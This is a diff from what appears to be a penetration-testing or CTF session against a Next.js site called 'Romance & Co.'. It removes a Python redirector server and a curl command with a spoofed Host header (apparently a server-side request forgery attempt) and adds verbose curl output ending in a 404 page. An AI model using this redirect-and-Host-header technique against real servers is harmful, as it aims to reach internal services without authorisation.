@@ -1,9 +1,61 @@
-# Создаем скрипт-редиректор на Python
-python3 -c "from http.server import HTTPServer, BaseHTTPRequestHandler;
-class R(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(302)
-        self.send_header('Location', 'http://localhost:3000/3WpzTMYEK9QG0eqIBQxrR')
-        self.end_headers()
-HTTPServer(('0.0.0.0', 80), R).serve_forever()"
-curl -v -L -H "RSC: 1" -H "Host: ТВОЙ_IP_VPN" http://10.81.150.158:3000/cgi-bin/
+Established connection to 10.81.150.158 (10.81.150.158 port 3000) from 192.168.188.192 port 56538 
+* using HTTP/1.x
+> GET /cgi-bin/ HTTP/1.1
+> Host: 192.168.188.192
+> User-Agent: curl/8.17.0
+> Accept: */*
+> RSC: 1
+> 
+* Request completely sent off
+< HTTP/1.1 308 Permanent Redirect
+< location: /cgi-bin
+< Refresh: 0;url=/cgi-bin
+< Date: Sat, 14 Feb 2026 14:12:42 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< Transfer-Encoding: chunked
+* Ignoring the response-body
+< 
+* Connection #0 to host 10.81.150.158:3000 left intact
+* Issue another request to this URL: 'http://10.81.150.158:3000/cgi-bin'
+* Reusing existing http: connection with host 10.81.150.158
+> GET /cgi-bin HTTP/1.1
+> Host: 192.168.188.192
+> User-Agent: curl/8.17.0
+> Accept: */*
+> RSC: 1
+> 
+* Request completely sent off
+< HTTP/1.1 404 Not Found
+< Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
+< Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
+< x-nextjs-cache: HIT
+< x-nextjs-prerender: 1
+< x-nextjs-prerender: 1
+< x-nextjs-stale-time: 300
+< Content-Type: text/x-component
+< Date: Sat, 14 Feb 2026 14:12:42 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< Transfer-Encoding: chunked
+< 
+1:"$Sreact.fragment"
+2:I[39756,["/_next/static/chunks/42879de7b8087bc9.js"],"default"]
+3:I[37457,["/_next/static/chunks/42879de7b8087bc9.js"],"default"]
+9:I[68027,["/_next/static/chunks/42879de7b8087bc9.js"],"default"]
+:HL["/_next/static/chunks/1f815b7460bf8647.css","style"]
+0:{"P":null,"b":"3WpzTMYEK9QGOeqIBQxrR","c":["","_not-found"],"q":"","i":false,"f":[[["",{"children":["/_not-found",{"children":["__PAGE__",{}]}]},"$undefined","$undefined",true],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/chunks/1f815b7460bf8647.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","script","script-0",{"src":"/_next/static/chunks/42879de7b8087bc9.js","async":true,"nonce":"$undefined"}]],["$","html",null,{"lang":"en","className":"dark","children":["$","body",null,{"className":"font-sans antialiased","children":[["$","div",null,{"className":"fixed inset-0 pointer-events-none overflow-hidden","style":{"zIndex":1},"children":[["$","div","0",{"className":"heart-float absolute text-4xl","style":{"left":"22.27351334252521%","animationDelay":"5.277690077882964s","fontSize":"2.266303741019396rem","opacity":0.2},"children":"💖"}],["$","div","1",{"className":"heart-float absolute text-4xl","style":{"left":"17.342794186707412%","animationDelay":"5.049397721437954s","fontSize":"1.4279437903421837rem","opacity":0.2},"children":"💝"}],["$","div","2",{"className":"heart-float absolute text-4xl","style":{"left":"88.723828422394%","animationDelay":"15.097210078679382s","fontSize":"1.1553743351245584rem","opacity":0.2},"children":"❤️"}],["$","div","3",{"className":"heart-float absolute text-4xl","style":{"left":"82.81702868056304%","animationDelay":"17.789881424778223s","fontSize":"2.3724895940202257rem","opacity":0.2},"children":"💖"}],["$","div","4",{"className":"heart-float absolute text-4xl","style":{"left":"58.732076475651176%","animationDelay":"18.041698664333392s","fontSize":"2.3497433331284197rem","opacity":0.2},"children":"💖"}],["$","div","5",{"className":"heart-float absolute text-4xl","style":{"left":"84.11984442581661%","animationDelay":"12.974314587848173s","fontSize":"1.860626249937079rem","opacity":0.2},"children":"💕"}],["$","div","6",{"className":"heart-float absolute text-4xl","style":{"left":"22.594670952882634%","animationDelay":"12.314478340610293s","fontSize":"1.0642053300980852rem","opacity":0.2},"children":"💗"}],["$","div","7",{"className":"heart-float absolute text-4xl","style":{"left":"85.6293447599556%","animationDelay":"9.764798622010762s","fontSize":"2.8571999766415885rem","opacity":0.2},"children":"💕"}],["$","div","8",{"className":"heart-float absolute text-4xl","style":{"left":"29.15604796028115%","animationDelay":"14.832298180374156s","fontSize":"2.710377258787324rem","opacity":0.2},"children":"💝"}],["$","div","9",{"className":"heart-float absolute text-4xl","style":{"left":"40.48648279965539%","animationDelay":"19.829758284395616s","fontSize":"1.199717644511257rem","opacity":0.2},"children":"💖"}],["$","div","10",{"className":"heart-float absolute text-4xl","style":{"left":"99.21786269109947%","animationDelay":"17.31793959701417s","fontSize":"1.740069507557783rem","opacity":0.2},"children":"❤️"}],["$","div","11",{"className":"heart-float absolute text-4xl","style":{"left":"87.63223399654201%","animationDelay":"2.9948924445675784s","fontSize":"2.3365486684175085rem","opacity":0.2},"children":"💝"}],["$","div","12",{"className":"heart-float absolute text-4xl","style":{"left":"90.75928540956524%","animationDelay":"18.64709832285845s","fontSize":"1.4960268079703911rem","opacity":0.2},"children":"💖"}],["$","div","13",{"className":"heart-float absolute text-4xl","style":{"left":"86.13135311870947%","animationDelay":"1.6465562433703784s","fontSize":"2.847092186106304rem","opacity":0.2},"children":"❤️"}],["$","div","14",{"className":"heart-float absolute text-4xl","style":{"left":"66.92849904984037%","animationDelay":"8.365292358675557s","fontSize":"2.290249442112866rem","opacity":0.2},"children":"💗"}]]}],["$","div",null,{"style":{"position":"relative","zIndex":10},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],"$L4","$L5"]}]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]}]]}],{"children":["$L6",{"children":["$L7",{},null,false,false]},null,false,false]},null,false,false],"$L8",false]],"m":"$undefined","G":["$9","$undefined"],"S":true}
+a:I[97367,["/_next/static/chunks/42879de7b8087bc9.js"],"OutletBoundary"]
+b:"$Sreact.suspense"
+d:I[97367,["/_next/static/chunks/42879de7b8087bc9.js"],"ViewportBoundary"]
+f:I[97367,["/_next/static/chunks/42879de7b8087bc9.js"],"MetadataBoundary"]
+4:["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":404}]
+5:["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]
+6:["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}]
+7:["$","$1","c",{"children":[[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":"$0:f:0:1:0:props:children:1:props:children:props:children:1:props:children:props:notFound:0:1:props:style","children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":"$4:props:style","children":404}],["$","div",null,{"style":"$5:props:style","children":["$","h2",null,{"style":"$5:props:children:props:style","children":"This page could not be found."}]}]]}]}]],null,["$","$La",null,{"children":["$","$b",null,{"name":"Next.MetadataOutlet","children":"$@c"}]}]]}]
+8:["$","$1","h",{"children":[["$","meta",null,{"name":"robots","content":"noindex"}],["$","$Ld",null,{"children":"$@e"}],["$","div",null,{"hidden":true,"children":["$","$Lf",null,{"children":["$","$b",null,{"name":"Next.Metadata","children":"$@10"}]}]}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}]
+e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
+11:I[27201,["/_next/static/chunks/42879de7b8087bc9.js"],"IconMark"]
+10:[["$","title","0",{"children":"Romance & Co. | Unforgettable Romantic Experiences"}],["$","meta","1",{"name":"description","content":"Create unforgettable romantic moments. From candlelit dinners to dream proposals, we craft personalized experiences for couples in love."}],["$","link","2",{"rel":"icon","href":"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💝</text></svg>"}],["$","$L11","3",{}]]
+c:null
+* Connection #0 to host 10.81.150.158:3000 left intact
